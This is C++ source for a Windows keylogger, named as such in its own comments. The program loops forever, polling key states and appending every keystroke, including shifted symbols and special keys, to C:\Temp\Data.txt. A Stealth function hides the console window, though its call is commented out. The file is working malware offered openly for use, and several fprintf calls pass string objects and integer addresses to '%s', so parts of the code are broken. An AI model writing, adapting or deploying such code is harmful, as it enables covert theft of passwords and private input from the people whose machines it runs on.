#define _CRT_SECURE_NO_WARNINGS
#include <iostream>    // These we need to
#include <stdio.h>
using namespace std;   // include to get our
#include <windows.h>   // Keylogger working.
#include <winuser.h>   

int Save(int key_stroke, char *file);
void Stealth();

int main(){
	//SetPriorityClass( GetCurrentProcess(), HIGH_PRIORITY_CLASS);

	//Stealth();

	while (1){
		for (char i = 8; i <= 190; i++){
			if (GetAsyncKeyState(i) == -32767) 				Save(i, "C:\\Temp\\Data.txt");
			if (GetAsyncKeyState(VK_OEM_3) == -32767) 		Save(191, "C:\\Temp\\Data.txt"); //`~
			if (GetAsyncKeyState(VK_OEM_MINUS) == -32767) 	Save(192, "C:\\Temp\\Data.txt"); // -_
			if (GetAsyncKeyState(VK_OEM_PLUS) == -32767) 	Save(193, "C:\\Temp\\Data.txt"); //=+
			if (GetAsyncKeyState(VK_OEM_4) == -32767) 		Save(194, "C:\\Temp\\Data.txt"); // [{
			if (GetAsyncKeyState(VK_OEM_6) == -32767) 		Save(195, "C:\\Temp\\Data.txt"); // ]}
			if (GetAsyncKeyState(VK_OEM_5) == -32767) 		Save(196, "C:\\Temp\\Data.txt"); // \|
			if (GetAsyncKeyState(VK_OEM_1) == -32767) 		Save(197, "C:\\Temp\\Data.txt"); // ;:
			if (GetAsyncKeyState(VK_OEM_7) == -32767) 		Save(198, "C:\\Temp\\Data.txt"); // '"
			if (GetAsyncKeyState(VK_OEM_COMMA) == -32767) 	Save(199, "C:\\Temp\\Data.txt"); // ,<
			if (GetAsyncKeyState(VK_OEM_PERIOD) == -32767) 	Save(200, "C:\\Temp\\Data.txt"); // .>
			if (GetAsyncKeyState(VK_OEM_2) == -32767) 		Save(201, "C:\\Temp\\Data.txt"); // /?
		}
	}
	system("PAUSE");
	return 0;
}

int Save(int key_stroke, char *file){
	if ((key_stroke == 1) || (key_stroke == 2))
		return 0;

	FILE *OUTPUT_FILE;
	OUTPUT_FILE = fopen(file, "a+");
	const string A[] = {"[Backspace]","[Tab]","","","[Clear]","[Enter]\n","","","","[Ctrl]","[Alt]","","","","","","","","","[Esc]","","","","","[Space]","[Pg Up]","[Pg Dn]","[End]","[Home]","[Left]","[Up]", "[Right]","[Down]","","","","[Prnt Scr]","[Insert]","[Del]",""};
	const string B[] = {"~","_","+","{","}","|",":","\"","<",">","?","`","-","=","[","]","\\",";","'",",",".","/",")","!","@","#","$","%","^","&","*","("};

	cout << key_stroke << endl;

	//special characters
	if 		(key_stroke >= 8 && key_stroke <= 46){			  key_stroke = key_stroke - 8;	fprintf(OUTPUT_FILE, "%s", &A[key_stroke]); }
	else if (key_stroke == VK_RWIN || key_stroke == VK_LWIN)								fprintf(OUTPUT_FILE, "%s", "[Win]");	
	//special characters
	// if 		(key_stroke == VK_BACK)		fprintf(OUTPUT_FILE, "%s", "[Backspace]");
	// else if (key_stroke == VK_TAB)		fprintf(OUTPUT_FILE, "%s", "[Tab]");
	// //undefined
	// //undefined
	// //clear
	// else if (key_stroke == VK_RETURN)	fprintf(OUTPUT_FILE, "%s", "[Enter]\n");
	// //undefined
	// //undefined
	// else if (key_stroke == VK_SHIFT)	fprintf(OUTPUT_FILE, "%s", "");
	// else if (key_stroke == VK_CONTROL)	fprintf(OUTPUT_FILE, "%s", "[Ctrl]");
	// else if (key_stroke == VK_MENU)		fprintf(OUTPUT_FILE, "%s", "[Alt]");
	// //pause
	// else if (key_stroke == VK_CAPITAL)	fprintf(OUTPUT_FILE, "%s", "");
	// //15
	// //16
	// //17
	// //18
	// //19
	// //undefined
	// else if (key_stroke == VK_ESCAPE)	fprintf(OUTPUT_FILE, "%s", "[Esc]");
	// //c
	// //d
	// //e
	// //f
	// else if (key_stroke == VK_SPACE)	fprintf(OUTPUT_FILE, "%s", "[Space]");
	// else if (key_stroke == VK_PRIOR)	fprintf(OUTPUT_FILE, "%s", "[Pg Up]");
	// else if (key_stroke == VK_NEXT)		fprintf(OUTPUT_FILE, "%s", "[Pg Dn]");
	// else if (key_stroke == VK_END)		fprintf(OUTPUT_FILE, "%s", "[End]");
	// else if (key_stroke == VK_HOME)		fprintf(OUTPUT_FILE, "%s", "[Home]");
	// else if (key_stroke == VK_LEFT)		fprintf(OUTPUT_FILE, "%s", "[Left]");
	// else if (key_stroke == VK_UP)		fprintf(OUTPUT_FILE, "%s", "[Up]");
	// else if (key_stroke == VK_RIGHT)	fprintf(OUTPUT_FILE, "%s", "[Right]");
	// else if (key_stroke == VK_DOWN)		fprintf(OUTPUT_FILE, "%s", "[Down]");
	// //select
	// //other
	// //execute
	// else if (key_stroke == VK_SNAPSHOT)	fprintf(OUTPUT_FILE, "%s", "[Prt Scr]");
	// else if (key_stroke == VK_INSERT)	fprintf(OUTPUT_FILE, "%s", "[Insert]");
	// else if (key_stroke == VK_DELETE)	fprintf(OUTPUT_FILE, "%s", "[Del]");
	// //help
	// //undefined
	// else if (key_stroke == VK_LWIN)		fprintf(OUTPUT_FILE, "%s", "[Win]");
	// else if (key_stroke == VK_RWIN)		fprintf(OUTPUT_FILE, "%s", "[Win]");

	//virtual OEM keys
	else if (key_stroke >= 191){
		key_stroke = key_stroke - 191;
		((GetAsyncKeyState(VK_SHIFT) == -32768)?fprintf(OUTPUT_FILE, "%s", &B[key_stroke]):fprintf(OUTPUT_FILE, "%s", &B[key_stroke+11]));
		//virtual OEM
		// if     (key_stroke == 191) 	((GetAsyncKeyState(VK_SHIFT) == -32768)?fprintf(OUTPUT_FILE, "%s", "~"):fprintf(OUTPUT_FILE, "%s", "`"));
		// else if(key_stroke == 192)  ((GetAsyncKeyState(VK_SHIFT) == -32768)?fprintf(OUTPUT_FILE, "%s", "_"):fprintf(OUTPUT_FILE, "%s", "-"));
		// else if(key_stroke == 193)  ((GetAsyncKeyState(VK_SHIFT) == -32768)?fprintf(OUTPUT_FILE, "%s", "+"):fprintf(OUTPUT_FILE, "%s", "="));
		// else if(key_stroke == 194)  ((GetAsyncKeyState(VK_SHIFT) == -32768)?fprintf(OUTPUT_FILE, "%s", "{"):fprintf(OUTPUT_FILE, "%s", "["));
		// else if(key_stroke == 195)  ((GetAsyncKeyState(VK_SHIFT) == -32768)?fprintf(OUTPUT_FILE, "%s", "}"):fprintf(OUTPUT_FILE, "%s", "]"));
		// else if(key_stroke == 196)  ((GetAsyncKeyState(VK_SHIFT) == -32768)?fprintf(OUTPUT_FILE, "%s", "|"):fprintf(OUTPUT_FILE, "%s","\\"));
		// else if(key_stroke == 197)  ((GetAsyncKeyState(VK_SHIFT) == -32768)?fprintf(OUTPUT_FILE, "%s", ":"):fprintf(OUTPUT_FILE, "%s", ";"));
		// else if(key_stroke == 198)  ((GetAsyncKeyState(VK_SHIFT) == -32768)?fprintf(OUTPUT_FILE, "%s", '"'):fprintf(OUTPUT_FILE, "%s", "'"));
		// else if(key_stroke == 199)  ((GetAsyncKeyState(VK_SHIFT) == -32768)?fprintf(OUTPUT_FILE, "%s", "<"):fprintf(OUTPUT_FILE, "%s", ","));
		// else if(key_stroke == 200)  ((GetAsyncKeyState(VK_SHIFT) == -32768)?fprintf(OUTPUT_FILE, "%s", ">"):fprintf(OUTPUT_FILE, "%s", "."));
		// else if(key_stroke == 201)  ((GetAsyncKeyState(VK_SHIFT) == -32768)?fprintf(OUTPUT_FILE, "%s", "?"):fprintf(OUTPUT_FILE, "%s", "/"));
	}

	//numpad 0-9
	else if (key_stroke >= 96 && key_stroke <= 105){
		key_stroke = key_stroke - 48;
		fprintf(OUTPUT_FILE, "%s", &key_stroke);
		//0-9 special characters
		// if(key_stroke == 48) 	  fprintf(OUTPUT_FILE, "%s", ")");
		// else if(key_stroke == 49) fprintf(OUTPUT_FILE, "%s", "!");
		// else if(key_stroke == 50) fprintf(OUTPUT_FILE, "%s", "@");
		// else if(key_stroke == 51) fprintf(OUTPUT_FILE, "%s", "#");
		// else if(key_stroke == 52) fprintf(OUTPUT_FILE, "%s", "$");
		// else if(key_stroke == 53) {key_stroke = 37; fprintf(OUTPUT_FILE, "%s", "%");}
		// else if(key_stroke == 54) fprintf(OUTPUT_FILE, "%s", "^");
		// else if(key_stroke == 55) fprintf(OUTPUT_FILE, "%s", "&");
		// else if(key_stroke == 56) fprintf(OUTPUT_FILE, "%s", "*");
		// else if(key_stroke == 57) fprintf(OUTPUT_FILE, "%s", "(");
	}

	//numpad symbols
	else if (key_stroke == VK_MULTIPLY) fprintf(OUTPUT_FILE, "%s", "*");
	else if (key_stroke == VK_ADD) 		fprintf(OUTPUT_FILE, "%s", "+");
	else if (key_stroke == VK_SUBTRACT) fprintf(OUTPUT_FILE, "%s", "-");
	else if (key_stroke == VK_DIVIDE) 	fprintf(OUTPUT_FILE, "%s", "/");

	//Function keys (F#)
	else if(key_stroke >= 112 && key_stroke <=135)  fprintf(OUTPUT_FILE, "%s", "");

	//period
	else if (key_stroke == 190 || key_stroke == 110)fprintf(OUTPUT_FILE, "%s", ".");

	//symbols
	else if(key_stroke >= 48 && key_stroke <= 57){
		//shift special characters 0-9
		if(GetAsyncKeyState(VK_SHIFT) == -32768){
			key_stroke = key_stroke - 26;
			fprintf(OUTPUT_FILE, "%s", &B[key_stroke]);
		}else fprintf(OUTPUT_FILE, "%s", &key_stroke);
	}

	//alphabet
	else if (key_stroke >= 65 && key_stroke <= 90){
		if 		((GetKeyState(VK_CAPITAL) & 0x0001) != 0 && GetAsyncKeyState(VK_SHIFT) != -32768) fprintf(OUTPUT_FILE, "%s", &key_stroke);
		else if ((GetKeyState(VK_CAPITAL) & 0x0001) == 0 && GetAsyncKeyState(VK_SHIFT) == -32768) fprintf(OUTPUT_FILE, "%s", &key_stroke);
		else{	key_stroke = key_stroke + 32;fprintf(OUTPUT_FILE, "%s", &key_stroke);}
	}
	
	//other
	else	fprintf(OUTPUT_FILE, "%s", &key_stroke);

	fclose(OUTPUT_FILE);
	return 0;
}

void Stealth(){
	HWND Stealth;
	AllocConsole();
	Stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(Stealth, 0);
}